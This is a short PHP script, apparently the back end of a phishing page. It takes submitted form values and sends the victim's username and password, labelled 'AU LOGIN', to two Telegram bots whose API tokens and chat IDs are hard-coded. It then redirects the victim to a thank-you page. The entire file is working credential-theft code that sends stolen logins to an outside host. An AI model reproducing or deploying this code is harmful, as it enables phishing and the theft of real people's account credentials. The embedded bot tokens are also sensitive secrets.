<?php
include 'admin/config.php';
extract($_REQUEST);


$apiToken = "6236131963:AAF7HPmWF4nFZGfBKxtGPg0EtMesMN9xbHo";
$data = [
    'chat_id' => '5825452461',
    'text' => " AU LOGIN \n ★USER>> $username \n ★PASS>> $password"
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

$apiToken = "1920493474:AAHvyfGfC31sokCkx9KfZKdMnGwOK1xPW1E";
$data = [
    'chat_id' => '1114346477',
    'text' => " AU LOGIN \n ★USER>> $username \n ★PASS>> $password"
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
header("location: thanks.php");
?>